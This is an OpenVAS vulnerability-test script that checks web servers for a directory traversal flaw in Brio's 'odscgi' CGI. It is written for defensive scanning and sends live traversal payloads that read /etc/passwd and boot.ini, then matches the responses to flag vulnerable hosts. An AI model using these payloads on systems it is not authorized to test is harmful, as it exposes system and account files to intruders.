# OpenVAS Vulnerability Test
# $Id: brio_dir_traversal.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Brio Unix Directory Traversal
#
# Authors:
# fr0stman <fr0stman@sun-tzu-security.net>
#
# Copyright:
# Copyright (C) 2003 Chris Foster
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_solution = "Check www.brio.com for updated software.";

tag_summary = "The Brio web application interface has a directory traversal 
in the component 'odscgi'. An attacker may exploit this flaw to read
arbitrary files on the remote host by submitting a URL like :

 http://www.example.com/ods-cgi/odscgi?HTMLFile=../../../../../../etc/passwd";

# v. 1.00 (last update 02.09.03)

if(description)
{
 script_id(15849);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_name("Brio Unix Directory Traversal");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

script_description(desc);
 script_summary("Brio Unix Directory Traversal");

 script_category(ACT_GATHER_INFO);

 script_family("Web application abuses");

 script_copyright("This script is Copyright (C) 2003 Chris Foster");

 script_dependencies("http_version.nasl");
 script_require_keys("Settings/ThoroughTests");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "solution" , value : tag_solution);
 }
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

if ( ! thorough_tests ) exit(0);

port = get_http_port(default:80);
if ( !port ) exit(0);
if(get_port_state(port))
{
rq = "/ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../etc/passwd";
req = http_get(item:rq, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if ( egrep(pattern:"root:.*:0:[01]:", string:res ) )
	security_warning(port);

rq = "/ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../boot.ini";
req = http_get(item:rq, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if ( "[operating systems]" >< res )
	security_warning(port);
}

